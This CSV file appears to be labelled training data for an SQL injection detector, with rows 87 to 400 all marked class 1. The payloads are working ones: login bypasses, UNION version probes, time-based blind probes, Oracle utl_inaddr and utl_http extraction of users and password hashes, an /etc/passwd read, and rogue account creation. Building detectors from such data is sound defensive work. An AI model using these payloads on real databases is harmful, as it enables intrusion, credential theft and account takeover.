index,payload,class
87," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
88," select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1
89,1 and user_name  (    )     =   'dbo',1
90,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",1
91," select * from users where id  =  1 or 1#""$ union select 1,version  (    )   -- 1",1
92," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",1
93,select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1
94,select * from users where id  =  1 +$+. or 1  =  1 -- 1,1
95,select * from users where id  =  1 or   (  \+  )    =  1 or 1  =  1 -- 1,1
96," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
97,or 1  =  1 or ''  =  ',1
98,select * from users where id  =  1   or 1  =  1 -- 1,1
99,or 'text' > 't',1
100,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
101," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",1
102," select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",1
103,admin' or '1'  =  '1'#,1
104,select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,1
105,s,1
106," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
107, select * from information_schema.tables--,1
108," select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",1
109,1   )    )    or pg_sleep  (  __TIME__  )  --,1
110," select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",1
111,declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,1
112, or 1  =  1 or ''  =  ',1
113,select * from users where id  =  1 %!<1 or 1  =  1 -- 1,1
114,declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
115," select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1
116," select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",1
117,or 'unusual'   =   'unusual',1
118, or 1 in   (  select @@version  )  --,1
119,truncate,1
120,as,1
121, or 3  =  3 --,1
122," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",1
123," select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",1
124,"admin""  )   or   (  ""1""  =  ""1",1
125," select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",1
126,"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
127," select * from users where id  =  1 union select .1_,version  (    )   -- 1",1
128, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,1
129," or 0  =  0 #""",1
130,select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,1
131,select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1
132,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1
133,1  )   or sleep  (  __TIME__  )  #,1
134," select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1
135," select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",1
136," select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",1
137,select * from users where id  =  1. <@ or 1  =  1 -- 1,1
138, or true--,1
139,select * from users where id  =  1 <@ or 1  =  1 -- 1,1
140," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1
141,admin' #,1
142," select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",1
143," select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",1
144," select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",1
145," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
146,"""  )  ;waitfor delay '0:0:__TIME__'--",1
147, or 'unusual'   =   'unusual',1
148,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",1
149,"admin"" or ""1""  =  ""1""/*",1
150," select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1
151," select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",1
152,like,1
153, )    )    or pg_sleep  (  __TIME__  )  --,1
154,select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,1
155,or 3  =  3,1
156," select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",1
157,select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,1
158,exec sp,1
159," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",1
160,select * from users where id  =  1 or \<$ or 1  =  1 -- 1,1
161," select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1
162,admin' or 1  =  1/*,1
163,a' waitfor delay '0:0:10'--,1
164," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",1
165," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",1
166,and 1 in   (  select var from temp  )  --,1
167,hi'  )   or   (  'a'  =  'a,1
168," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
169,"admin"" or 1  =  1",1
170,"""  )   or true--",1
171," select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",1
172," select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",1
173,1  )   or pg_sleep  (  __TIME__  )  --,1
174," select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",1
175,"""  )   or sleep  (  __TIME__  )    =  """,1
176,select * from users where id  =  1.<@. or 1  =  1 -- 1,1
177,"admin""  )   or   (  ""1""  =  ""1""--",1
178," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",1
179," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1
180,select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,1
181," select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",1
182," select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",1
183,1 and 1  =  1,1
184,or 0  =  0 #,1
185,union select * from users where login   =   char ...,1
186," select * from users where id  =  1 union select 1||@,version  (    )   -- 1",1
187,admin'  )   or '1'  =  '1'--,1
188," select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",1
189," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1
190," select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",1
191," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
192,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1
193,procedure,1
194,or ''  =  ',1
195, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,1
196," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
197," select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",1
198,select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',1
199,""" or """"^""",1
200,"""-""",1
201," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",1
202," select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",1
203," select * from users where id  =  1 *\ union select null,@@VERSION -- 1",1
204," select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",1
205," select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",1
206,admin'/*,1
207," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",1
208,||UTL_HTTP.REQUEST,1
209," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
210," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1
211,"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",1
212," select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",1
213," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",1
214,select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',1
215,1 uni/**/on select all from where,1
216," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",1
217," select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1
218,admin'  )   or '1'  =  '1'#,1
219,||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
220,or '7659'  =  '7659,1
221," select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",1
222," select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1
223," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
224," select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1
225,or true--,1
226," select * from users where id  =  1 union select !<1,version  (    )   -- 1",1
227," select * from users where id  =  '1' union select \#,@@VERSION -- 1'",1
228," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",1
229,""" or true--",1
230,select * from users where id  =  1. or 1  =  1 -- 1,1
231," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",1
232," select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",1
233,â or 3  =  3 --,1
234, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,1
235," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",1
236," select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",1
237," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",1
238," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",1
239," select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",1
240, or uid like '%,1
241,select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',1
242," select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",1
243," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",1
244," select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",1
245," select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",1
246,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,1
247," select * from users where id  =  '1' union select \,@@VERSION -- 1'",1
248,0 or 1  =  1,1
249,select * from users where id  =  1 &@ or 1  =  1 -- 1,1
250,"admin""  )   or ""1""  =  ""1",1
251,select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1
252," select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",1
253," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
254," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
255,select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1
256,select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',1
257,""" or """"*""",1
258,"hi or 1  =  1 --""",1
259," select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",1
260," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
261," select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1
262,select * from information_schema.tables--,1
263,select * from users where id  =  1 or \<\. or 1  =  1 -- 1,1
264,   (  select top 1,1
265,Ã½ or 1  =  1 --,1
266,a' --,1
267, or 1  =  1 /*,1
268," select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1
269," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",1
270,--,1
271,"exec sp_addlogin 'name' , 'password'",1
272," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",1
273,0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,1
274," select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1
275," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1
276,group by userid having 1  =  1--,1
277," select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",1
278,select * from users where id  =  1 *1 or 1  =  1 -- 1,1
279," select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1
280,‘ or 1  =  1 --,1
281," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1
282,select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,1
283,or 'a'  =  'a,1
284,declare @s varchar  (  22  )   select @s   = ,1
285," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1
286," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1
287," select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1
288,@variable,1
289,select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,1
290," select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1
291," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1
292," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1
293," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1
294, and 1 in   (  select var from temp  )  --,1
295," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1
296," select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1
297," select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1
298,or x  =  x,1
299,or a  =  a,1
300,or '1'  =  '1,1
301," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1
302,   )    )    or    (    (   'x'   )    )     =     (    (   'x,1
303," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1
304," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1
305," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1
306,select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1
307," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1
308," select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1
309," select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1
310," select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1
311,a' or 1  =  1--,1
312, )   or   (  a  =  a,1
313,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1
314," select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1
315," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1
316,-- &password  = ,1
317,select * from users where id  =  1 <@. or 1  =  1 -- 1,1
318," select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1
319," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1
320," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1
321, or '1'  =  '1,1
322,admin' or 1  =  1,1
323," select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1
324," select * from users where id  =  1 union select @||1,version  (    )   -- 1",1
325," select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1
326," select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1
327," union select * from users where login   =   char  (  114,111,111,116  )  ;",1
328," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1
329, or 1  =  1--,1
330," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
331,pg_sleep  (  __TIME__  )  --,1
332,‘ or 3  =  3 --,1
333," select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1
334," select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1
335," select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1
336,"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1
337, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1
338," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
339,""" or """" """,1
340,delete,1
341, or 1  =  1 --,1
342,1' and non_existant_table   =   '1,1
343," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1
344," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1
345,declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1
346," select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1
347," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1
348," select * from users where id  =  1 union select @<@,version  (    )   -- 1",1
349," select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1
350, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1
351," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1
352,select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1
353," select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1
354," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1
355,UNION ALL SELECT,1
356," select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1
357,select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1
358," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1
359,x' or full_name like '%bob%,1
360, or 2 > 1,1
361,select * from users where id  =  1.*1 or 1  =  1 -- 1,1
362,"""  )   or pg_sleep  (  __TIME__  )  --",1
363, ',1
364," select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1
365," select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1
366,select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1
367, )   or sleep  (  __TIME__  )    =  ',1
368,sleep 50',1
369," select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1
370,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1
371," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1
372,or sleep  (  __TIME__  )    =  ',1
373," select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1
374," select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1
375," select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1
376," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1
377," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1
378,or 2 > 1,1
379,anything' OR 'x'  =  'x,1
380," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1
381," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1
382," select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1
383,&',1
384,a' or 3  =  3--,1
385," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1
386," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1
387,"admin""or 1  =  1 or """"  =  """,1
388,uni/**/on sel/**/ect,1
389,""" or """"&""",1
390," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1
391,1 waitfor delay '0:0:10'--,1
392,bfilename,1
393,admin'  )   or   (  '1'  =  '1'--,1
394,UEf,1
395, -- &password  = ,1
396,1 or sleep  (  __TIME__  )  #,1
397," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1
398," select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1
399," select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1
400,or sleep  (  __TIME__  )  #,1
